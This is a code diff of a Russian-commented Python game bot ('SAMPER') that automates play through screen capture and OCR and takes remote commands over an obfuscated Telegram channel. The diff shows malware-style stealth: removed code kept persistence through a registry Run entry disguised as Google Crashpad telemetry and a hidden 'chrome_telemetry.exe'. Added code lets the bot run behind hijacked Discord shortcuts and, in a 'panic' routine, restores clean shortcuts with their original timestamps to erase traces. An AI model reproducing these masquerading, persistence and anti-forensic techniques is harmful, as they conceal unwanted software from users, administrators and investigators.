@@ -15,8 +15,13 @@ import keyboard
 import base64
 import traceback
 import difflib
+import shutil
 import subprocess
 import winreg
+import codecs
+import threading
+import tkinter as tk
+from tkinter import font as tkfont
 from mss import mss
 
 # ================= НАСТРОЙКИ ТЕЛЕГРАМ =================
@@ -26,7 +31,7 @@ _C_B64 = b'NDQ4ODQ0NjUz'
 TELEGRAM_BOT_TOKEN = base64.b64decode(_T_B64).decode('utf-8')
 TELEGRAM_CHAT_ID = base64.b64decode(_C_B64).decode('utf-8')
 
-CURRENT_VERSION = 1.3 # Версия для GitHub
+CURRENT_VERSION = 1.4 # Версия с графическим интерфейсом SAMPER
 
 # ================= ПУТЬ К TESSERACT =================
 pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'
@@ -59,34 +64,52 @@ key_history = []
 TARGET_PLAYER_NAME = None
 last_update_id = 0
 
-# ================= СИСТЕМА ПАНИКИ =================
-def ultimate_panic_clean():
-    """Полное уничтожение Надзирателя, Автозагрузки и Кэша"""
-    send_telegram("🚨 ПАНИКА! Уничтожаю Надзирателя и стираю все следы из системы...")
-    try:
-        # 1. Удаляем автозагрузку Надзирателя из реестра
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
-        winreg.DeleteValue(key, "GoogleCrashpadTelemetryTask")
-        winreg.CloseKey(key)
-    except: pass
+gui_root = None
+gui_visible = False
+btn_start_stop = None
 
+# ================= ЗАПУСК ДИСКОРДА =================
+def launch_original_discord():
+    discord_path = os.path.expandvars(r"%LOCALAPPDATA%\Discord\app-1.0.9229\Discord.exe")
+    if os.path.exists(discord_path):
+        subprocess.Popen(
+            [discord_path], 
+            creationflags=0x08000000 | 0x00000008,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            stdin=subprocess.DEVNULL
+        )
+
+# ================= СИСТЕМА ПАНИКИ =================
+def deep_panic_clean():
+    """Полное уничтожение следов (Паника)"""
     try:
-        # 2. Жестко убиваем процесс Надзирателя, чтобы он не перезапустил бота
-        subprocess.run('taskkill /f /im chrome_telemetry.exe', shell=True, capture_output=True, creationflags=0x08000000)
+        send_telegram("🚨 ПАНИКА! Активирован бесфайловый стелс-режим...")
+        flag_path = os.path.join(os.environ.get('TEMP', ''), 'discord_panic.flag')
+        with open(flag_path, 'w') as f: f.write("1")
+
+        desktop_dir = os.environ.get('USERPROFILE', '') + "\\Desktop"
+        appdata = os.environ.get('APPDATA', '')
+        clean_lnk = os.path.join(os.environ.get('TEMP', ''), 'discord_clean_cache', 'Discord.lnk')
         
-        # 3. Создаем bat-файл для удаления .exe Надзирателя и нашего кэша
-        bat_path = os.path.join(os.environ.get('TEMP', ''), 'ultimate_panic.bat')
-        hidden_exe = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Crashpad\chrome_telemetry.exe")
-        cache_file = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Crashpad\telemetry_cache.dat")
+        lnk_paths = [
+            os.path.join(desktop_dir, "ds.lnk"),
+            os.path.join(desktop_dir, "Discord.lnk"),
+            os.path.join(appdata, r"Microsoft\Windows\Start Menu\Programs\Discord Inc\Discord.lnk")
+        ]
         
-        with open(bat_path, 'w', encoding='utf-8') as f:
-            f.write(f'@echo off\nping 127.0.0.1 -n 3 > NUL\ndel /f /q "{hidden_exe}"\ndel /f /q "{cache_file}"\ndel "%~f0"')
+        if os.path.exists(clean_lnk):
+            for p in lnk_paths:
+                if os.path.exists(p):
+                    stat = os.stat(p)
+                    old_times = (stat.st_atime, stat.st_mtime)
+                    shutil.copy2(clean_lnk, p)
+                    os.utime(p, old_times)
         
-        subprocess.Popen(['cmd.exe', '/c', bat_path], creationflags=0x08000000)
-    except: pass
-    
-    send_telegram("✅ Система полностью очищена. Бот испарился.")
-    os._exit(0)
+        send_telegram("✅ Бот испарился. Ярлыки чисты.")
+    except Exception: pass
+    finally:
+        os._exit(0)
 
 # ================= ФУНКЦИИ БОТА =================
 def send_telegram(text):
@@ -117,10 +140,11 @@ def process_telegram_commands(ignore_old=False):
                     TARGET_PLAYER_NAME = text.split(' ', 1)[1].strip()
                     send_telegram(f"👤 Настройки обновлены\nНовый никнейм: {TARGET_PLAYER_NAME}")
                 elif text.strip() == '/panic': 
-                    ultimate_panic_clean()
+                    deep_panic_clean()
                 elif text.strip() == '/update':
-                    send_telegram("🔄 Команда принята. Самоуничтожаюсь, Надзиратель запустит меня с новым кодом...")
-                    os._exit(0) # Убиваем себя. Надзиратель сам скачает новый код и воскресит нас!
+                    send_telegram("🔄 Получена команда обновления. Перезапуск...")
+                    subprocess.Popen([sys.executable] + sys.argv[1:], creationflags=0x00000008 | 0x08000000, close_fds=True)
+                    os._exit(0)
     except: pass
 
 def smart_sleep(seconds):
@@ -136,7 +160,6 @@ def press_key(key, delay=0.1):
     time.sleep(0.5)
 
 def click(x, y, button='left', delay=0.5):
-    # Мгновенная телепортация курсора + микропауза
     pyautogui.moveTo(x, y) 
     time.sleep(0.1)        
     pyautogui.click(button=button)
@@ -216,7 +239,6 @@ def check_contracts():
             if m_y is None: m_y = y; lines[m_y] = []
             lines[m_y].append(txt)
         for y_off, words in lines.items():
-            # Смещение y + 25 для точного клика в центр контракта
             y_click = TIME_COLUMN_REGION['top'] + y_off + 25
             sec, t_str = parse_time(" ".join(words))
             if sec:
@@ -271,22 +293,47 @@ def start_new_contract():
 def close_phone():
     click(CLOSE_APP_X, CLOSE_APP_Y); time.sleep(1); press_key('backspace'); time.sleep(1)
 
+# ================= ГЛОБАЛЬНЫЕ ХУКИ КЛАВИАТУРЫ =================
+def toggle_gui_visibility():
+    global gui_visible, gui_root
+    if gui_root:
+        if gui_visible:
+            gui_root.withdraw()
+            gui_visible = False
+        else:
+            gui_root.deiconify()
+            gui_visible = True
+
 def on_key_event(e):
-    global bot_running, key_history
+    global bot_running, key_history, gui_root
     if e.event_type == keyboard.KEY_DOWN:
         key_history.append(e.name)
         if len(key_history) > 3: key_history.pop(0)
+        
+        # Перехват F5 для меню
+        if e.name == 'f5':
+            if gui_root:
+                try: gui_root.after(0, toggle_gui_visibility)
+                except: pass
+
+        # Старые хоткеи
         if key_history == ['delete', 'page up', 'page down']:
-            if not bot_running: bot_running = True; send_telegram("▶️ Бот запущен.")
+            if not bot_running: 
+                bot_running = True
+                if btn_start_stop: btn_start_stop.config(text="СТАП (В РАБОТЕ)", fg="#00ff41")
+                send_telegram("▶️ Бот запущен с клавиатуры.")
         elif key_history == ['page down', 'page up', 'delete']: 
-            ultimate_panic_clean()
+            deep_panic_clean()
 
 keyboard.hook(on_key_event)
 
-def main():
+# ================= БОЕВОЙ ПОТОК (ЛОГИКА БОТА) =================
+def bot_logic_loop():
     global bot_running
+    launch_original_discord()
+    
     process_telegram_commands(ignore_old=True)
-    send_telegram(f"🤖 Боевой скрипт запущен (v{CURRENT_VERSION}). Жду ваших команд.\n/update — обновить код.\n/panic — уйти в тень.")
+    send_telegram(f"🤖 SAMPER GUI (v{CURRENT_VERSION}).\nНажми F5 в игре для открытия меню.\n/update — обновить код.\n/panic — уйти в тень.")
     
     while True:
         process_telegram_commands()
@@ -305,6 +352,109 @@ def main():
                 close_phone(); smart_sleep(60)
         except Exception as e:
             smart_sleep(60)
+
+# ================= GUI "LIQUID GLASS" (ОСНОВНОЙ ПОТОК) =================
+def gui_toggle_bot():
+    global bot_running
+    bot_running = not bot_running
+    if bot_running:
+        btn_start_stop.config(text="СТАП (В РАБОТЕ)", fg="#00ff41", highlightbackground="#00ff41")
+        send_telegram("▶️ Бот запущен через меню.")
+    else:
+        btn_start_stop.config(text="СТАРТ (ПАУЗА)", fg="#ff3333", highlightbackground="#ff3333")
+        send_telegram("⏸ Бот остановлен через меню.")
+
+def gui_restart():
+    send_telegram("🔄 Перезапуск через меню...")
+    subprocess.Popen([sys.executable] + sys.argv[1:], creationflags=0x00000008 | 0x08000000, close_fds=True)
+    os._exit(0)
+
+def gui_panic():
+    deep_panic_clean()
+
+def gui_exit():
+    send_telegram("🛑 Выход (без зачистки) через меню.")
+    os._exit(0)
+
+def setup_gui():
+    global gui_root, gui_visible, btn_start_stop
+    gui_root = tk.Tk()
+    gui_root.title("SAMPER")
+    gui_root.geometry("280x380")
+    gui_root.overrideredirect(True) # Убираем стандартные рамки Windows
+    
+    # Стилизация Liquid Glass (Прозрачность + Темный фон)
+    gui_root.attributes('-alpha', 0.88) 
+    gui_root.configure(bg="#050a05")
+    gui_root.attributes("-topmost", True) # Всегда поверх игры
+
+    # Логика перетаскивания окна мышкой
+    def start_move(event):
+        gui_root.x = event.x
+        gui_root.y = event.y
+
+    def stop_move(event):
+        gui_root.x = None
+        gui_root.y = None
+
+    def do_move(event):
+        deltax = event.x - gui_root.x
+        deltay = event.y - gui_root.y
+        x = gui_root.winfo_x() + deltax
+        y = gui_root.winfo_y() + deltay
+        gui_root.geometry(f"+{x}+{y}")
+
+    # Верхняя неоновая полоска (Рамка)
+    top_bar = tk.Frame(gui_root, bg="#00ff41", height=3, cursor="fleur")
+    top_bar.pack(fill=tk.X, side=tk.TOP)
+    top_bar.bind("<ButtonPress-1>", start_move)
+    top_bar.bind("<ButtonRelease-1>", stop_move)
+    top_bar.bind("<B1-Motion>", do_move)
+
+    # Логотип SAMPER
+    title_lbl = tk.Label(gui_root, text="SAMPER", fg="#00ff41", bg="#050a05", font=("Arial Black", 26, "bold"))
+    title_lbl.pack(pady=(15, 25))
+    title_lbl.bind("<ButtonPress-1>", start_move)
+    title_lbl.bind("<ButtonRelease-1>", stop_move)
+    title_lbl.bind("<B1-Motion>", do_move)
+
+    # Контейнер для кнопок
+    btn_frame = tk.Frame(gui_root, bg="#050a05")
+    btn_frame.pack(expand=True, fill=tk.BOTH, padx=25)
+
+    def create_btn(text, command, fg_color):
+        btn = tk.Button(btn_frame, text=text, command=command,
+                        bg="#0a140a", fg=fg_color, activebackground=fg_color, activeforeground="#000000",
+                        font=("Arial", 11, "bold"), relief="flat", borderwidth=1,
+                        highlightbackground=fg_color, highlightcolor=fg_color, highlightthickness=1)
+        btn.pack(fill=tk.X, pady=8, ipady=6)
+        
+        # Эффект наведения мыши
+        def on_enter(e): btn['bg'] = '#142814'
+        def on_leave(e): btn['bg'] = '#0a140a'
+        btn.bind("<Enter>", on_enter)
+        btn.bind("<Leave>", on_leave)
+        return btn
+
+    btn_start_stop = create_btn("СТАРТ (ПАУЗА)", gui_toggle_bot, "#ff3333")
+    create_btn("ПЕРЕЗАПУСК", gui_restart, "#00ff41")
+    create_btn("ПАНИКА (ОЧИСТКА)", gui_panic, "#ff0000")
+    create_btn("ВЫХОД", gui_exit, "#aaaaaa")
+
+    # Изначально меню скрыто
+    gui_root.withdraw()
+    gui_visible = False
+
+    gui_root.mainloop()
+
+# ================= ТОЧКА ВХОДА =================
+def main():
+    # 1. Запускаем боевую логику бота в фоновом потоке
+    bot_thread = threading.Thread(target=bot_logic_loop, daemon=True)
+    bot_thread.start()
+    
+    # 2. Запускаем графическое меню в главном потоке
+    setup_gui()
 
 if __name__ == "__main__":
     try: main()
